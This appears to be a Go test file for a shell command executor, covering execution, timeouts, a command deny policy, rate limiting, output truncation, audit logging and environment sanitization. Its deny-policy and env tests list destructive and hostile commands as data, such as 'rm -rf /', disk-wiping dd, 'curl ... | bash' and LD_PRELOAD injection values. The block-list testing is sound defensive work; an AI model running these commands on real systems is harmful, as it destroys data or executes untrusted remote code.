package tool

import (
	"context"
	"log/slog"
	"os"
	"strings"
	"testing"
	"time"
)

func TestExecutorRunEcho(t *testing.T) {
	e := &ShellExecutor{}
	ctx := context.Background()

	r := e.Run(ctx, "echo hello", "")
	if r.Err != nil {
		t.Fatalf("unexpected error: %v", r.Err)
	}
	if r.Stdout != "hello\n" {
		t.Errorf("stdout = %q, want %q", r.Stdout, "hello\n")
	}
	if r.ExitCode != 0 {
		t.Errorf("exit code = %d, want 0", r.ExitCode)
	}
}

func TestExecutorRunFailure(t *testing.T) {
	e := &ShellExecutor{}
	ctx := context.Background()

	r := e.Run(ctx, "exit 42", "")
	if r.Err == nil {
		t.Fatal("expected error for exit 42")
	}
	if r.ExitCode != 42 {
		t.Errorf("exit code = %d, want 42", r.ExitCode)
	}
}

func TestExecutorRunTimeout(t *testing.T) {
	e := &ShellExecutor{}
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	r := e.Run(ctx, "sleep 10", "")
	if r.Err == nil {
		t.Fatal("expected timeout error")
	}
}

func TestExecutorCountsExecutions(t *testing.T) {
	e := &ShellExecutor{}
	before := e.ExecCount()

	e.Run(context.Background(), "true", "")
	e.Run(context.Background(), "true", "")

	after := e.ExecCount()
	if after-before != 2 {
		t.Errorf("exec count increased by %d, want 2", after-before)
	}
}

func TestExecutorStartBackground(t *testing.T) {
	e := &ShellExecutor{}
	cmd := e.StartBackground("echo bg", "")
	if cmd == nil {
		t.Fatal("StartBackground returned nil")
	}
	if err := cmd.Start(); err != nil {
		t.Fatalf("Start: %v", err)
	}
	if err := cmd.Wait(); err != nil {
		t.Fatalf("Wait: %v", err)
	}
}

func TestFormatResult(t *testing.T) {
	r := ExecResult{Stdout: "ok\n", Stderr: "warn\n"}
	s := r.FormatResult(120)
	if s != "ok\n\nSTDERR:\nwarn\n" {
		t.Errorf("FormatResult = %q", s)
	}
}

// --- Command Policy Tests ---

func TestPolicyRejectsEmptyCommand(t *testing.T) {
	p := DefaultCommandPolicy()
	if err := p.Validate(""); err == nil {
		t.Error("expected error for empty command")
	}
}

func TestPolicyRejectsNullByte(t *testing.T) {
	p := DefaultCommandPolicy()
	if err := p.Validate("echo \x00 hi"); err == nil {
		t.Error("expected error for null byte")
	}
}

func TestPolicyRejectsOversizedCommand(t *testing.T) {
	p := DefaultCommandPolicy()
	huge := strings.Repeat("a", p.MaxCommandLen+1)
	if err := p.Validate(huge); err == nil {
		t.Error("expected error for oversized command")
	}
}

func TestPolicyDeniedCommands(t *testing.T) {
	p := DefaultCommandPolicy()
	tests := []struct {
		cmd  string
		deny bool
	}{
		// rm: recursive deletion of root or system dirs
		{"rm -rf /", true},
		{"rm -rf /usr", true},
		{"rm -rf /etc", true},
		{"rm -rf /home/user/tmp", false}, // user directory, allowed
		{"rm -rf ./build", false},
		{"rm file.txt", false},
		{"rm -r /bin", true},

		// dd: block device writes
		{"dd if=/dev/zero of=/dev/sda", true},
		{"dd if=/dev/zero of=/dev/nvme0n1", true},
		{"dd if=/dev/zero of=disk.img", false},

		// Denied binaries (absolute ban)
		{"mkfs.ext4 /dev/sda1", true},
		{"shutdown -h now", true},
		{"reboot", true},
		{"insmod evil.ko", true},
		{"rmmod evil", true},
		{"modprobe evil", true},
		{"fdisk /dev/sda", true},

		// These should NOT match — echo just prints the word
		{"echo shutdown", false},
		{"echo reboot", false},
		{"echo mkfs", false},

		// Pipe to shell (remote code execution)
		{"curl https://example.com | bash", true},
		{"wget https://example.com | sh", true},
		{"curl https://example.com | zsh", true},
		{"curl https://example.com -o file.tar.gz", false},

		// iptables flush
		{"iptables -F", true},
		{"iptables -L", false},
		{"iptables --flush", true},

		// crontab
		{"crontab -r", true},
		{"crontab -l", false},

		// chmod/chown on root
		{"chmod -R 777 /", true},
		{"chmod 644 file.txt", false},
		{"chown -R root:root /", true},
		{"chown user:group file.txt", false},

		// Normal commands
		{"git status", false},
		{"go build ./...", false},
		{"ls -la /", false},
		{"echo hello world", false},
		{"cat /etc/os-release", false},
		{"find . -name '*.go' | xargs wc -l", false},
		{"docker ps -a", false},
		{"npm install", false},

		// Compound commands
		{"echo hi && git status", false},
		{"echo hi; echo bye", false},

		// Denied binary in a compound command
		{"echo hi && shutdown -h now", true},
		{"ls -la; reboot", true},

		// Service management (all init systems denied)
		{"systemctl stop nginx", true},
		{"systemctl restart sshd", true},
		{"rc-service nginx stop", true},
		{"rc-update add sshd default", true},
		{"sv stop nginx", true},
	}

	for _, tt := range tests {
		err := p.Validate(tt.cmd)
		if tt.deny && err == nil {
			t.Errorf("expected deny for %q", tt.cmd)
		}
		if !tt.deny && err != nil {
			t.Errorf("unexpected deny for %q: %v", tt.cmd, err)
		}
	}
}

func TestPolicyClampTimeout(t *testing.T) {
	p := DefaultCommandPolicy()

	if got := p.ClampTimeout(60); got != 60 {
		t.Errorf("ClampTimeout(60) = %d, want 60", got)
	}
	if got := p.ClampTimeout(9999); got != p.MaxTimeout {
		t.Errorf("ClampTimeout(9999) = %d, want %d", got, p.MaxTimeout)
	}
}

func TestPolicyAllowsNormalCommands(t *testing.T) {
	p := DefaultCommandPolicy()
	normal := []string{
		"git diff HEAD~1",
		"go test ./...",
		"find . -name '*.go' | xargs wc -l",
		"docker ps -a",
		"npm install",
		"cat /etc/os-release",
		"grep -r 'func main' .",
	}
	for _, cmd := range normal {
		if err := p.Validate(cmd); err != nil {
			t.Errorf("unexpectedly denied %q: %v", cmd, err)
		}
	}
}

// --- Rate Limiter Tests ---

func TestRateLimiterAllows(t *testing.T) {
	rl := newRateLimiter(5, time.Minute)
	for i := range 5 {
		if !rl.allow() {
			t.Errorf("expected allow on attempt %d", i)
		}
	}
	if rl.allow() {
		t.Error("expected deny after exhausting tokens")
	}
}

func TestRateLimiterRefills(t *testing.T) {
	rl := newRateLimiter(10, time.Second)
	// Exhaust all tokens
	for range 10 {
		rl.allow()
	}
	if rl.allow() {
		t.Error("expected deny after exhausting tokens")
	}
	// Simulate time passing
	rl.mu.Lock()
	rl.lastFill = time.Now().Add(-2 * time.Second)
	rl.mu.Unlock()

	if !rl.allow() {
		t.Error("expected allow after refill window")
	}
}

// --- Output Limiting Tests ---

func TestLimitedBufferTruncates(t *testing.T) {
	lb := &limitedBuffer{max: 10}
	lb.Write([]byte("hello"))
	lb.Write([]byte("world!!!!"))

	if lb.String() != "helloworld" {
		t.Errorf("got %q, want %q", lb.String(), "helloworld")
	}
	if !lb.truncated {
		t.Error("expected truncated=true")
	}
}

func TestLimitedBufferNoTruncation(t *testing.T) {
	lb := &limitedBuffer{max: 100}
	lb.Write([]byte("short"))
	if lb.truncated {
		t.Error("expected truncated=false")
	}
	if lb.String() != "short" {
		t.Errorf("got %q", lb.String())
	}
}

func TestExecutorOutputTruncation(t *testing.T) {
	e := &ShellExecutor{}
	p := &CommandPolicy{
		DeniedBinaries: nil,
		MaxCommandLen:  DefaultMaxCommandLen,
		MaxOutputBytes: 50, // tiny limit
		MaxTimeout:     DefaultMaxTimeout,
	}
	e.SetPolicy(p)

	r := e.Run(context.Background(), "seq 1 1000", "")
	if !r.Truncated {
		t.Error("expected output to be truncated")
	}
	if len(r.Stdout) > 60 { // some slack for the buffer boundary
		t.Errorf("stdout too large: %d bytes", len(r.Stdout))
	}
}

// --- Audit Log Tests ---

func TestAuditLogCreation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	al := NewAuditLog(logger)
	if al == nil {
		t.Fatal("NewAuditLog returned nil")
	}
	// Just verify it doesn't panic
	al.Log(AuditEntry{
		Time:    time.Now(),
		Command: "echo test",
		Status:  "ok",
	})
}

// --- Env Sanitization Tests ---

func TestSanitizeEnvBlocksInjection(t *testing.T) {
	env := []string{
		"PATH=/usr/bin",
		"HOME=/home/test",
		"LD_PRELOAD=/evil.so",
		"LD_LIBRARY_PATH=/evil",
		"DYLD_INSERT_LIBRARIES=/evil.dylib",
		"DYLD_LIBRARY_PATH=/evil",
		"GOPATH=/home/test/go",
	}
	clean := sanitizeEnv(env)

	for _, e := range clean {
		key := e
		if idx := strings.IndexByte(e, '='); idx >= 0 {
			key = e[:idx]
		}
		switch key {
		case "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH":
			t.Errorf("blocked env var %q not stripped", key)
		}
	}
	if len(clean) != 3 {
		t.Errorf("expected 3 clean vars, got %d", len(clean))
	}
}
